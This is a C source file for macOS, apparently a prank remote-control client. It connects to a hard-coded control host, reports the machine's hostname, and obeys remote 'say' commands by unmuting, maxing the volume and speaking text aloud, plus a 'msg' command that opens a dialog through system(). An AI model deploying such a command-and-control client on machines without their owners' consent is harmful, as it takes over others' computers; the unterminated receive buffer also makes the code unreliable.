#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>

#include <CoreFoundation/CoreFoundation.h>
#include <ApplicationServices/ApplicationServices.h>
#include <CoreAudio/CoreAudio.h>
#include <AudioToolbox/AudioServices.h>

char *attribution = "Courtesy of Parker McGee <pmcgee@salesforce.com>.";

char* control_host = "pmcgee-ltm4";
char* control_port = "8090";

SpeechChannel speech_chan;

AudioDeviceID getDefaultOutputDeviceID();
AudioObjectPropertyAddress getVolumeProperty();
AudioObjectPropertyAddress getMuteProperty();
void unMute();
void setVolume(float volume);
int send_sock(int sock, char *msg);
int speak(char *msg);

int main(int argc, char** argv)
{
    int status;
    struct addrinfo hints;
    struct addrinfo *servinfo;

    NewSpeechChannel(NULL, &speech_chan);

    signal(SIGPIPE, SIG_IGN);
    
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    
    if ((status = getaddrinfo(control_host, control_port, &hints, &servinfo))) {
        fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(status));
        exit(1);
    }
    
    int s;
    
    s = socket(servinfo->ai_family, servinfo->ai_socktype, servinfo->ai_protocol);
    
    connect(s, servinfo->ai_addr, servinfo->ai_addrlen);
    
    freeaddrinfo(servinfo);
    
    char hostname[64];
    int hostname_res;
    
    hostname_res = gethostname(hostname, sizeof hostname);

    if (hostname_res == -1) {
        printf("Error: %s\n", strerror(errno));
        exit(1);
    }

    printf("hostname: %s\n", hostname);
    
    char msg[1024];
    
    sprintf(msg, "Hi there, how are you? I'm %s\n", hostname);
    
    int bytes_sent;

    bytes_sent = send_sock(s, msg);

    int recv_bytes;

    char cmd[1024];

    while (1) {
        recv_bytes = recv(s, cmd, sizeof cmd, 0);

        if (recv_bytes == -1 || recv_bytes == 0) {
            break;
        }

        sprintf(msg, "Command received: %s\n", cmd);
        printf("%s", msg);
        
        bytes_sent = send_sock(s, msg);

        if (strncmp(cmd, "say ", 4) == 0) {
            char *pos = strstr(cmd, "\n");
            if (pos != NULL) {
                // Terminate the string at the first end-of-line... hacky
                *pos = 0;
            }
            unMute();
            setVolume(1.0);
            speak(&cmd[4]);
        }
        else if (strncmp(cmd, "msg", 3) == 0) {
            system("osascript -e 'tell app \"System Events\" to display dialog \"Hello World\"'");
        }
    }
    
    close(s);

    DisposeSpeechChannel(speech_chan);

    return 0;
}

AudioDeviceID getDefaultOutputDeviceID()
{
    AudioDeviceID outputDeviceID = kAudioObjectUnknown;

    // get output device device
    OSStatus status = noErr;
    AudioObjectPropertyAddress propertyAOPA;
    propertyAOPA.mScope = kAudioObjectPropertyScopeGlobal;
    propertyAOPA.mElement = kAudioObjectPropertyElementMaster;
    propertyAOPA.mSelector = kAudioHardwarePropertyDefaultOutputDevice;

    if (!AudioHardwareServiceHasProperty(kAudioObjectSystemObject, &propertyAOPA))
    {
        printf("Cannot find default output device!");
        return outputDeviceID;
    }

    status = AudioHardwareServiceGetPropertyData(kAudioObjectSystemObject, &propertyAOPA, 0, NULL, (UInt32[]){sizeof(AudioDeviceID)}, &outputDeviceID);

    if (status != 0) 
    {
        printf("Cannot find default output device!");
    }
    return outputDeviceID;
}

AudioObjectPropertyAddress getVolumeProperty()
{
    AudioObjectPropertyAddress propertyAOPA;
    
    propertyAOPA.mElement = kAudioObjectPropertyElementMaster;
    propertyAOPA.mSelector = kAudioHardwareServiceDeviceProperty_VirtualMasterVolume;
    propertyAOPA.mScope = kAudioDevicePropertyScopeOutput;

    return propertyAOPA;
}

AudioObjectPropertyAddress getMuteProperty()
{
    AudioObjectPropertyAddress propertyAOPA;
    
    propertyAOPA.mElement = kAudioObjectPropertyElementMaster;
    propertyAOPA.mSelector = kAudioDevicePropertyMute;
    propertyAOPA.mScope = kAudioDevicePropertyScopeOutput;

    return propertyAOPA;
}

void unMute()
{
    AudioDeviceID deviceID = getDefaultOutputDeviceID();    
    AudioObjectPropertyAddress propertyAOPA = getMuteProperty();

    UInt32 setting = 0;

    OSStatus result = AudioHardwareServiceSetPropertyData(deviceID, &propertyAOPA, 0, NULL, sizeof setting, &setting);

    if(kAudioHardwareNoError != result) {
        printf("There was an error");
    }
}

void setVolume(float volume) {
    AudioDeviceID deviceID = getDefaultOutputDeviceID();

    AudioObjectPropertyAddress propertyAOPA = getVolumeProperty();

    OSStatus result = AudioHardwareServiceSetPropertyData(deviceID, &propertyAOPA, 0, NULL, sizeof volume, &volume);

    if(kAudioHardwareNoError != result) {
        printf("There was an error");
    }
}

int send_sock(int sock, char *msg) {
    int msg_len = strlen(msg);
    int bytes_sent = 0;

    while (bytes_sent < msg_len) {
        int sent_len = send(sock, msg+(bytes_sent*sizeof(char)), msg_len - bytes_sent, 0);

        if (sent_len == -1) {
            return -1;
        }
        
        bytes_sent += sent_len;
    }

    return bytes_sent;
}

int speak(char *msg) {
    printf("Saying %s\n", msg);

    CFStringRef say_string = CFStringCreateWithCString(NULL, msg, kCFStringEncodingASCII);
    SpeakCFString(speech_chan, say_string, NULL);

    return 1;
}
